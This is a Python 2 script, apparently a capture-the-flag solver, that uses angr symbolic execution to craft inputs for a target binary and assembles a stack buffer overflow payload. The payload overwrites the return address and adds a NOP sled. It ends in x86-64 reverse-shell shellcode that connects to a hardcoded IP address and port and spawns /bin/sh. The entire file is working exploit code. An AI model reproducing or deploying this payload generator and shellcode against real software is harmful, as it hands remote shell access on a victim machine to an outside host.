import angr
import os
import base64
import datetime
import time
import simuvex
import struct
import sys

ts = time.time()

f = open("last", "r")
BINARY = f.readline().strip("\n")
f.close()

shellcode = (
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02"
"\x23\x1d" # PORT
"\xc7\x44\x24\x04"
"\x8d\xdf\xaf\xe5" # IPADDR
"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05")

DEBUG = True

p64 = lambda x: struct.pack("<Q", x)
u64 = lambda x: struct.unpack("<Q", x)

def p(msg):
  print "[*] %s" % msg

def get_fails():
  os.system("objdump -S ./bins/%s | grep ret > fails" % BINARY)
  
  fails = []

  f = open("fails", "r")

  while True:
    line = f.readline()
    if not line:
      break

    fail_addr_str = line.split(":")[0][1:]
    fail_addr = int(fail_addr_str, 16)

    fails.append(fail_addr)

  f.close()

  return fails

def get_calls():
  os.system("objdump -S ./bins/%s | grep call > calls" % BINARY)
  
  calls = []

  f = open("calls", "r")

  #for i in range(20):
  for i in range(9):
    f.readline()

  line = f.readline()

  for i in range(0x51):    
    caller_addr_str = line.split()[0][:-1]
    caller_addr = int(caller_addr_str, 16) - 0x2A

    line = f.readline()

    call_addr_str = line.split()[7]
    call_addr = int(call_addr_str, 16)

    calls.append((caller_addr, call_addr))

  f.close()

  return calls

def generate_exploit (vuln_addr, entry_point, argv1_buff):
  BIN = "./bins/%s" % BINARY

  project = angr.Project(BIN, load_options={"auto_load_libs": False})

  fails = get_fails()
  calls = get_calls()

  # target_addr = vuln_addr

  if DEBUG:
    p("Entry point: %x" % entry_point)
    p("Vuln address: %x" % vuln_addr)
    p("argv1 address: %x" % argv1_buff)
    
  payloads = []
  i = 0

  for (entry_point, target_addr) in calls:
    # Run angr
    # target_addr = addr

    print "%d" % i
    print "%x" % entry_point
    print "%x" % target_addr
 
    i += 1

    argv1 = angr.claripy.BVS("argv1", 0x144 * 8)

    start_state = project.factory.blank_state(addr = entry_point)
    start_state.options.discard("LAZY_SOLVES")
    start_state.se._solver.timeout = 10000
    start_state.memory.store(argv1_buff, argv1)
    
    pg = project.factory.path_group(start_state, immutable = False)
    pg.explore(find = target_addr, avoid = tuple(fails))

    payload = pg.found[0].state.se.any_str(argv1)

    # print payload.encode("hex")

     
    payloads.append(payload)
  
  payload = "\x00" * 0x144
  for s in payloads:
    for i in range(len(payload)):
      payload = payload[:i] + chr(ord(s[i]) | ord(payload[i])) + payload[i+1:]

  payload += "A" * (0x14e - len(payload))
  payload += "A" * 0x10
  payload += "A" * 0x8  # sfp
  payload += p64(argv1_buff + 0x200) #ret_addr
  
  payload += "\x90" * (0x200 - len(payload))
  payload += shellcode
  
  if DEBUG:
    p("Payload: %s" % payload.encode("hex"))

  return payload

def main(vuln_addr, entry_point, argv1_buff):
  payload = generate_exploit (vuln_addr, entry_point, argv1_buff)
 
  p("The payload is ...")
  p("[*] %s" % payload.encode("hex"))

  f = open("payload", "w")
  f.write(payload.encode("hex"))
  f.close()

  p("Terminated at %s" % datetime.datetime.fromtimestamp(ts).strftime('%H_%M_%S'))

if __name__ == '__main__':
  if len(sys.argv) == 4:
    vuln_addr = int(sys.argv[1])
    entry_point = int(sys.argv[2])
    argv1_buff = int(sys.argv[3])

    sys.exit(main(vuln_addr, entry_point, argv1_buff))
  else:
    print "[*] ./solver2.py [vuln_addr] [entry_point] [argv1_buff]"

